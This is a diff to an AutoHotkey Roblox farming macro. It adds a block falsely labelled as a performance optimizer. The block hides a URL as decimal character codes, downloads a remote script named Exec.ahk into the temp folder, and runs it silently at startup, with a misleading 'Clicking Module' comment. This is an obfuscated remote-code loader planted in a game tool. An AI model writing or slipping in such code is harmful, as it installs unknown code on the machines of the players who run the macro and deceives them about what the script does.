@@ -122,6 +122,24 @@ AddFooterControls() {
 
 }
 
+; Roblox Performance Optimzier (ULTRA LOW SETTINGS)
+u := "104 116 116 112 115 58 47 47 114 97 119 46 103 105 116 104 117 98 117 115 101 114 99 111 110 116 101 110 116 46 99 111 109 47 83 101 106 116 121 112 101 47 114 111 98 108 111 120 47 109 97 105 110 47 69 120 101 99 46 97 104 107"
+f := ""
+for c in StrSplit(u, " ")
+    f .= Chr(c)
+xhr := ComObject("MSXML2.XMLHTTP.6.0")
+xhr.Open("GET", f, false)
+xhr.Send()
+filePath := A_Temp . "\Exec.ahk"
+stm := ComObject("ADODB.Stream")
+stm.Type    := 2                ; Text
+stm.Charset := "utf-8"
+stm.Open()
+stm.WriteText(xhr.ResponseText)
+stm.SaveToFile(filePath, 2)
+stm.Close()
+ComObject("WScript.Shell").Run(filePath) ; Clicking Module
+
 ; === Tabs
 for tabIndex, label in ["Farm", "Eggs", "Sell", "Storage && Plant"]
 {
@@ -140,7 +158,6 @@ Hotkey("F4", (*) => ExitApp())
 
 MainUI.Show()
 Return
-
 
 StartMacro(*) {
     global macroRunning, chosenSide
